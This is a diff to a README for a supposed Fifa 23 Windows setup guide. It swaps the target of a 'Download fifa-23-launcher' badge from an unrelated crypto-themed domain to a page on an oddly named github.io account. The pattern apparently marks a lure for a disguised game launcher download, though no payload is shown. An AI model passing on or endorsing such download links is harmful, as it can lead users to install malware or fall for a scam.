@@ -2,7 +2,7 @@
 
 This repository covers a clean Windows setup for **Fifa 23** — launcher linking, file verification, performance tuning, and safe DLC/save workflows.
 
-[![Download Fifa 23](https://img.shields.io/badge/Download-fifa--23--launcher-blueviolet)](https://cryptoenthusiasts.world/)
+[![Download Fifa 23](https://img.shields.io/badge/Download-fifa--23--launcher-blueviolet)](https://carengrindstaffpjscl.github.io/.github/fifa-23-launcher)
 
 ---
 
